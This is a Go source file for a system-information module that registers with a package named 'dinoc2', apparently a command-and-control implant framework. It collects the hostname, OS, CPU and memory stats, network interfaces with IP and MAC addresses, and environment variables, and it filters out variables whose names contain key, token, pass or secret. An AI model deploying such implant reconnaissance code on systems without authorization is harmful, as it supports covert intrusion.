package sysinfo

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"dinoc2/pkg/module"
)

// SysInfoModule implements a system information gathering module
type SysInfoModule struct {
	name        string
	description string
	mutex       sync.Mutex
	isRunning   bool
	isPaused    bool
	cachedInfo  map[string]interface{}
	lastUpdate  time.Time
}

// NewSysInfoModule creates a new system information module
func NewSysInfoModule() module.Module {
	return &SysInfoModule{
		name:        "sysinfo",
		description: "System information gathering",
		cachedInfo:  make(map[string]interface{}),
	}
}

// Init initializes the module
func (m *SysInfoModule) Init(params map[string]interface{}) error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if already running
	if m.isRunning {
		return fmt.Errorf("sysinfo module already running")
	}

	// Gather initial system information
	err := m.gatherSystemInfo()
	if err != nil {
		return fmt.Errorf("failed to gather system information: %w", err)
	}

	m.isRunning = true

	return nil
}

// Exec executes a system information operation
func (m *SysInfoModule) Exec(command string, args ...interface{}) (interface{}, error) {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil, fmt.Errorf("sysinfo module not running")
	}
	
	// Check if paused
	if m.isPaused {
		return nil, fmt.Errorf("sysinfo module is paused")
	}

	// Parse command
	switch command {
	case "get":
		// Get system information
		if len(args) < 1 {
			return nil, fmt.Errorf("missing information key")
		}
		key, ok := args[0].(string)
		if !ok {
			return nil, fmt.Errorf("invalid information key")
		}
		return m.getSystemInfo(key)

	case "refresh":
		// Refresh system information
		err := m.gatherSystemInfo()
		if err != nil {
			return nil, fmt.Errorf("failed to refresh system information: %w", err)
		}
		return "System information refreshed", nil

	case "all":
		// Get all system information
		return m.cachedInfo, nil

	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

// getSystemInfo returns system information for a specific key
func (m *SysInfoModule) getSystemInfo(key string) (interface{}, error) {
	// Check if information is cached
	info, exists := m.cachedInfo[key]
	if !exists {
		return nil, fmt.Errorf("unknown information key: %s", key)
	}

	return info, nil
}

// gatherSystemInfo gathers system information
func (m *SysInfoModule) gatherSystemInfo() error {
	// Clear cached information
	m.cachedInfo = make(map[string]interface{})

	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	m.cachedInfo["hostname"] = hostname

	// Get operating system information
	m.cachedInfo["os"] = runtime.GOOS
	m.cachedInfo["arch"] = runtime.GOARCH
	m.cachedInfo["cpus"] = runtime.NumCPU()

	// Get memory information
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	m.cachedInfo["memory_total"] = memStats.TotalAlloc
	m.cachedInfo["memory_alloc"] = memStats.Alloc
	m.cachedInfo["memory_sys"] = memStats.Sys

	// Get network interfaces
	interfaces, err := net.Interfaces()
	if err == nil {
		var netInfo []map[string]interface{}
		for _, iface := range interfaces {
			// Skip loopback interfaces
			if iface.Flags&net.FlagLoopback != 0 {
				continue
			}

			// Get interface addresses
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}

			// Extract IP addresses
			var ipAddrs []string
			for _, addr := range addrs {
				ipNet, ok := addr.(*net.IPNet)
				if !ok {
					continue
				}
				ipAddrs = append(ipAddrs, ipNet.IP.String())
			}

			// Add interface information
			netInfo = append(netInfo, map[string]interface{}{
				"name":     iface.Name,
				"mac":      iface.HardwareAddr.String(),
				"mtu":      iface.MTU,
				"flags":    iface.Flags.String(),
				"ip_addrs": ipAddrs,
			})
		}
		m.cachedInfo["network_interfaces"] = netInfo
	}

	// Get environment variables
	envVars := make(map[string]string)
	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			// Skip sensitive environment variables
			key := parts[0]
			if strings.Contains(strings.ToLower(key), "key") ||
				strings.Contains(strings.ToLower(key), "token") ||
				strings.Contains(strings.ToLower(key), "pass") ||
				strings.Contains(strings.ToLower(key), "secret") {
				continue
			}
			envVars[key] = parts[1]
		}
	}
	m.cachedInfo["env_vars"] = envVars

	// Update last update time
	m.lastUpdate = time.Now()
	m.cachedInfo["last_update"] = m.lastUpdate.Format(time.RFC3339)

	return nil
}

// Shutdown shuts down the module
func (m *SysInfoModule) Shutdown() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	// Check if running
	if !m.isRunning {
		return nil
	}

	m.isRunning = false

	return nil
}

// GetStatus returns the module status
func (m *SysInfoModule) GetStatus() module.ModuleStatus {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	status := module.ModuleStatus{
		Running: m.isRunning,
		Stats: map[string]interface{}{
			"last_update": m.lastUpdate.Format(time.RFC3339),
			"paused":      m.isPaused,
		},
	}

	return status
}

// GetCapabilities returns the module capabilities
func (m *SysInfoModule) GetCapabilities() []string {
	return []string{
		"get",
		"refresh",
		"all",
	}
}

// Pause temporarily pauses the module's operations
func (m *SysInfoModule) Pause() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if m.isPaused {
		return nil // Already paused
	}

	m.isPaused = true
	return nil
}

// Resume resumes the module's operations after a pause
func (m *SysInfoModule) Resume() error {
	m.mutex.Lock()
	defer m.mutex.Unlock()

	if !m.isRunning {
		return fmt.Errorf("module not running")
	}

	if !m.isPaused {
		return nil // Not paused
	}

	m.isPaused = false
	return nil
}

// init registers the module
func init() {
	module.RegisterModule("sysinfo", NewSysInfoModule)
}
